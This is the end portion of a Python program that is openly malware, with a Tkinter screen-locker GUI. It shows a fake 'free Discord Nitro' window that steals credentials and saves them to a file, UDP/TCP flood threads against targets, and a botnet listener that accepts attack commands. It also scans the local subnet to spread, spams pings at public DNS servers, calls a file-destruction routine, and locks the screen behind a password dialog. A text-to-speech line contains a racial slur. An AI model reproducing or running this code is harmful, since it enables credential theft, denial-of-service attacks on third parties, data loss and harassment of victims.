        label.pack(pady=20)
        t = threading.Thread(target=play_mario_repeat, args=(win, audio_path), daemon=True)
        t.start()
        mario_windows.append(win)
    root.after(30000, start_final_phase)

def play_mario_repeat(window, audio_path):
    pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)
    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play(-1)
    while phase == 2 and window.winfo_exists():
        time.sleep(0.1)
    pygame.mixer.music.stop()

def start_phase1():
    global phase, bytebeat_thread
    phase = 1
    for win, _, _ in spam_windows:
        try:
            win.destroy()
        except:
            pass
    spam_windows.clear()
    disable_password_window()
    bytebeat_thread = threading.Thread(target=salinewin_bytebeat_loop, args=(1.8, True, False, False), daemon=True)
    bytebeat_thread.start()
    threading.Thread(target=tts_speak, args=("your computer has been hacked by the nigvirus", 0.5), daemon=True).start()
    root.after(30000, spawn_mario_windows)

def start_final_phase():
    global phase, bytebeat_running
    phase = 3
    bytebeat_running = False
    for win in mario_windows:
        try:
            win.destroy()
        except:
            pass
    mario_windows.clear()
    threading.Thread(target=play_slowed_breathe, daemon=True).start()
    show_r_fullscreen()

def glitch_effect():
    global glitch_window
    if phase != 0:
        return
    glitch = tk.Toplevel()
    glitch.attributes('-fullscreen', True, '-topmost', True)
    glitch.attributes('-alpha', 0.3)
    glitch.configure(bg='black')
    canvas = tk.Canvas(glitch, highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)
    def update_glitch():
        if phase != 0:
            glitch.destroy()
            return
        canvas.delete("all")
        for _ in range(random.randint(50, 200)):
            x1 = random.randint(0, glitch.winfo_screenwidth())
            y1 = random.randint(0, glitch.winfo_screenheight())
            x2 = x1 + random.randint(10, 100)
            y2 = y1 + random.randint(10, 100)
            color = random.choice(['red', 'green', 'blue', 'white', 'black', 'magenta', 'cyan'])
            canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline='')
        root.after(50, update_glitch)
    update_glitch()
    glitch_window = glitch

def icmp_ping(ip):
    try:
        subprocess.run(['ping', '-n', '1', '-w', '100', ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
    except:
        pass

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    data = random._urandom(1024)
    while ddos_active and spam_active:
        try:
            sock.sendto(data, (target_ip, target_port))
        except:
            pass

def tcp_flood(target_ip, target_port):
    while ddos_active and spam_active:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.send(random._urandom(512))
            sock.close()
        except:
            pass

def start_ddos():
    global ddos_active
    ddos_active = True
    for target_ip, target_port in ddos_targets:
        for _ in range(50):
            threading.Thread(target=udp_flood, args=(target_ip, target_port), daemon=True).start()
            threading.Thread(target=tcp_flood, args=(target_ip, target_port), daemon=True).start()

def ping_spam():
    common_ips = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222", "208.67.220.220", "4.2.2.4", "4.2.2.1"]
    while spam_active:
        for ip in common_ips:
            threading.Thread(target=icmp_ping, args=(ip,), daemon=True).start()
        time.sleep(0.01)

def botnet_listener(port):
    global BOTNET_IPS, ddos_targets
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    while spam_active:
        try:
            client, addr = server.accept()
            if addr[0] not in BOTNET_IPS:
                BOTNET_IPS.append(addr[0])
            client.send(b"BOT_REGISTERED")
            cmd = client.recv(1024).decode()
            if cmd.startswith("ATTACK:"):
                parts = cmd.split(":")
                if len(parts) == 3:
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    if (target_ip, target_port) not in ddos_targets:
                        ddos_targets.append((target_ip, target_port))
            client.close()
        except:
            pass

def botnet_beacon():
    while spam_active:
        for port in BOTNET_PORTS:
            for ip in BOTNET_IPS[:]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((ip, port))
                    sock.send(b"PING")
                    sock.close()
                except:
                    if ip in BOTNET_IPS:
                        BOTNET_IPS.remove(ip)
        time.sleep(5)

def propagate_to_local_network():
    local_ip = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(local_ip.split('.')[:-1]) + '.'
    for i in range(1, 255):
        target_ip = subnet + str(i)
        if target_ip == local_ip:
            continue
        try:
            for port in BOTNET_PORTS:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    if target_ip not in BOTNET_IPS:
                        BOTNET_IPS.append(target_ip)
                sock.close()
        except:
            pass

def show_phishing_window():
    global discord_creds
    phishing = tk.Toplevel(root)
    phishing.title("FREE NITRO")
    phishing.geometry("450x500")
    phishing.attributes('-topmost', True)
    phishing.grab_set()
    nitro_img = load_nitro_image()
    if nitro_img:
        lbl_nitro = tk.Label(phishing, image=nitro_img)
        lbl_nitro.pack(pady=10)
        image_refs.append(nitro_img)
    canvas = tk.Canvas(phishing, width=400, height=60, bg='white', highlightthickness=0)
    canvas.pack(pady=5)
    try:
        font = ImageFont.truetype("arial.ttf", 24)
    except:
        font = ImageFont.load_default()
    start_color = (255, 105, 180)
    end_color = (255, 20, 147)
    create_gradient_text(canvas, "FREE DISCORD NITRO", 20, 10, font, start_color, end_color)
    tk.Label(phishing, text="Get 1 year of Nitro for free!\nEnter your Discord credentials to claim.", font=("Arial", 10), bg='white').pack(pady=5)
    tk.Label(phishing, text="Discord Username:", bg='white').pack(pady=(10,0))
    username_entry = tk.Entry(phishing, width=30)
    username_entry.pack()
    tk.Label(phishing, text="Password:", bg='white').pack(pady=(5,0))
    password_entry = tk.Entry(phishing, show="*", width=30)
    password_entry.pack()
    result_label = tk.Label(phishing, text="", fg="red", bg='white')
    result_label.pack(pady=5)
    def submit():
        global discord_creds
        username = username_entry.get()
        password = password_entry.get()
        if username and password:
            discord_creds = (username, password)
            with open(os.path.join(CURRENT_DIR, "discord_creds.txt"), "w") as f:
                f.write(f"Username: {username}\nPassword: {password}\n")
            phishing.destroy()
        else:
            result_label.config(text="Please fill both fields.")
    def force_close():
        pass
    tk.Button(phishing, text="Claim Nitro", command=submit, bg="green", fg="white", width=15).pack(pady=20)
    phishing.protocol("WM_DELETE_WINDOW", force_close)
    root.wait_window(phishing)

def check_password():
    global spam_active, ddos_active, password_window, phase
    password_window = tk.Toplevel(root)
    password_window.title("Stop Virus")
    password_window.geometry("300x150")
    password_window.attributes('-topmost', True)
    password_window.grab_set()
    tk.Label(password_window, text="Enter password to stop:", font=("Arial", 12)).pack(pady=10)
    entry = tk.Entry(password_window, show="*", font=("Arial", 12))
    entry.pack(pady=5)
    result_label = tk.Label(password_window, text="", fg="red")
    result_label.pack()
    def verify():
        entered_hash = hashlib.sha256(entry.get().encode()).hexdigest()
        if entered_hash == PASSWORD_HASH:
            spam_active = False
            ddos_active = False
            phase = 99
            for win, _, _ in spam_windows:
                try: win.destroy()
                except: pass
            for win in mario_windows:
                try: win.destroy()
                except: pass
            if glitch_window:
                try: glitch_window.destroy()
                except: pass
            if r_window:
                try: r_window.destroy()
                except: pass
            if ram_phish_window:
                try: ram_phish_window.destroy()
                except: pass
            if blast_window:
                try: blast_window.destroy()
                except: pass
            if countdown_window:
                try: countdown_window.destroy()
                except: pass
            if crash_window:
                try: crash_window.destroy()
                except: pass
            if robux_window:
                try: robux_window.destroy()
                except: pass
            password_window.destroy()
            root.quit()
            root.destroy()
            os._exit(0)
        else:
            result_label.config(text="Wrong password. Try again.")
            entry.delete(0, tk.END)
            for _ in range(20):
                if phase == 0:
                    spawn_window()
            password_window.after(100, verify)
    tk.Button(password_window, text="OK", command=verify, width=10).pack(pady=10)
    password_window.protocol("WM_DELETE_WINDOW", lambda: None)

def play_dogwhistle():
    audio_path = os.path.join(CURRENT_DIR, "dogwhistle.ogg")
    if not os.path.exists(audio_path):
        return
    try:
        pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)
        pygame.mixer.music.load(audio_path)
        pygame.mixer.music.set_volume(1.0)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy() and spam_active and phase == 0:
            if password_window:
                password_window.lift()
                password_window.attributes('-topmost', True)
            pygame.time.wait(100)
        pygame.mixer.quit()
    except:
        pass

def start_timers():
    root.after(15000, start_phase1)

if __name__ == "__main__":
    # Start terminal tester in a separate thread
    threading.Thread(target=terminal_tester, daemon=True).start()
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    show_phishing_window()
    load_protected_image()
    load_crushed_nitro()
    threading.Thread(target=glitch_effect, daemon=True).start()
    root.after(100, animate_windows)
    threading.Thread(target=play_dogwhistle, daemon=False).start()
    threading.Thread(target=destroy_files, daemon=True).start()
    threading.Thread(target=ping_spam, daemon=True).start()
    threading.Thread(target=propagate_to_local_network, daemon=True).start()
    threading.Thread(target=botnet_beacon, daemon=True).start()
    for port in BOTNET_PORTS:
        threading.Thread(target=botnet_listener, args=(port,), daemon=True).start()
    root.after(0, spam_windows_loop)
    root.after(100, start_ddos)
    root.after(0, check_password)
    root.after(0, start_timers)
    root.mainloop()